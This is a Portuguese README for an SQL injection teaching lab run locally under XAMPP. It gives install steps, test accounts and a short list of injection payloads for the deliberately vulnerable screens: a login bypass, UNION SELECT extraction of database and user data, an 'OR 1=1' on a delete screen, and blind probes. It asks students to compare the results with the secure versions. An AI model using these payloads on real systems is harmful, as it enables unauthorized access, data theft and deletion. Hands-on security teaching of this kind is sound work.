LABORATÓRIO DIDÁTICO - SQL INJECTION

Uso somente em localhost ou ambiente autorizado.

COMO INSTALAR NO XAMPP
1. Copie a pasta testesqlinjection_lab para:
   C:\xampp\htdocs\testesqlinjection_lab

2. Abra o XAMPP e inicie:
   - Apache
   - MySQL

3. Acesse o phpMyAdmin:
   http://localhost/phpmyadmin

4. Importe o arquivo banco.sql

5. Acesse:
   http://localhost/testesqlinjection_lab/index.php

USUÁRIOS DE TESTE
admin@teste.com / 123456
aluno@teste.com / 123456

ROTEIRO RÁPIDO
1. Login vulnerável:
   admin@teste.com' OR '1'='1' #
   senha: qualquer coisa

2. Busca por ID:
   1 OR 1=1
   1 UNION SELECT 1, database(), user(), 'teste'

3. Produtos:
   %' OR '1'='1' #
   %' UNION SELECT id, nome, email, perfil FROM usuarios #

4. Exclusão:
   1 OR 1=1

5. Blind:
   1' AND '1'='1' #
   1' AND '1'='2' #

Depois, repetir nas telas seguras e comparar.
